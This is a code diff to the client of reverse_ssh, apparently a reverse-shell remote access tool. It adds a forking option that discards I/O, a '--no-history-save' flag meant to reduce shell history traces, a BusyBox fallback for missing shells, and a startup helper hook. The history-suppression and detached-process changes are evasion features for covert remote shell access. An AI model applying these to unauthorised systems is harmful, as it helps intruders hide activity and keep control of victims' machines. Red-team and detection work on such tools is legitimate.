@@ -20,14 +20,30 @@ import (
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 )
 
-func fork(path string, sysProcAttr *syscall.SysProcAttr, pretendArgv ...string) error {
+type forkOptions struct {
+	DiscardIO bool
+}
+
+func fork(path string, sysProcAttr *syscall.SysProcAttr, options forkOptions, pretendArgv ...string) error {
 
 	cmd := exec.Command(path)
 	cmd.Args = pretendArgv
 	cmd.Env = append(os.Environ(), "F="+strings.Join(os.Args, " "))
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
 	cmd.SysProcAttr = sysProcAttr
+	if options.DiscardIO {
+		nullFile, err := os.OpenFile(os.DevNull, os.O_RDWR, 0)
+		if err != nil {
+			return err
+		}
+		defer nullFile.Close()
+
+		cmd.Stdin = nullFile
+		cmd.Stdout = nullFile
+		cmd.Stderr = nullFile
+	} else {
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+	}
 
 	err := cmd.Start()
 
@@ -46,6 +62,8 @@ var (
 	customSNI   string
 	// golang can only embed strings using the compile time linker
 	useHostKerberos string
+	noHistorySave   string
+	busyBoxFallback string
 	logLevel        string
 
 	ntlmProxyCreds string
@@ -68,6 +86,8 @@ func printHelp() {
 	fmt.Println("\t\t--version-string\tSSH version string to use, i.e SSH-VERSION, defaults to internal.Version-runtime.GOOS_runtime.GOARCH")
 	fmt.Println("\t\t--private-key-path\tOptional path to unencrypted SSH key to use for connecting")
 	fmt.Println("\t\t--connect-timeout\tDuration to wait for initial connection seconds, default 180, set to 0 to wait indefinitely")
+	fmt.Println("\t\t--no-history-save\tDetach startup and reduce shell history persistence for commands run through this client")
+	fmt.Println("\t\t--busybox-fallback\tUse embedded BusyBox on Linux when shell or command executables are missing")
 
 	if runtime.GOOS == "windows" {
 		fmt.Println("\t\t--use-kerberos\tUse kerberos authentication on proxy server (if proxy server specified)")
@@ -81,6 +101,8 @@ func makeInitialSettings() (*client.Settings, error) {
 		ProxyAddr:            proxy,
 		Addr:                 destination,
 		ProxyUseHostKerberos: useHostKerberos == "true",
+		NoHistorySave:        noHistorySave == "true",
+		BusyBoxFallback:      busyBoxFallback == "true",
 		SNI:                  customSNI,
 		VersionString:        versionString,
 	}
@@ -95,6 +117,9 @@ func makeInitialSettings() (*client.Settings, error) {
 }
 
 func main() {
+	if runExecassHelperIfRequested() {
+		return
+	}
 
 	settings, err := makeInitialSettings()
 	if err != nil {
@@ -202,6 +227,12 @@ func main() {
 	if line.IsSet("use-kerberos") {
 		settings.ProxyUseHostKerberos = true
 	}
+	if line.IsSet("no-history-save") {
+		settings.NoHistorySave = true
+	}
+	if line.IsSet("busybox-fallback") {
+		settings.BusyBoxFallback = true
+	}
 
 	versionString, err := line.GetArgString("version-string")
 	if err == nil {
@@ -260,7 +291,7 @@ func main() {
 		return
 	}
 
-	if strings.HasPrefix(destination, "stdio://") {
+	if strings.HasPrefix(settings.Addr, "stdio://") {
 		// We cant fork off of an inetd style connection or stdin/out will be closed
 		log.SetOutput(io.Discard)
 		Run(settings)
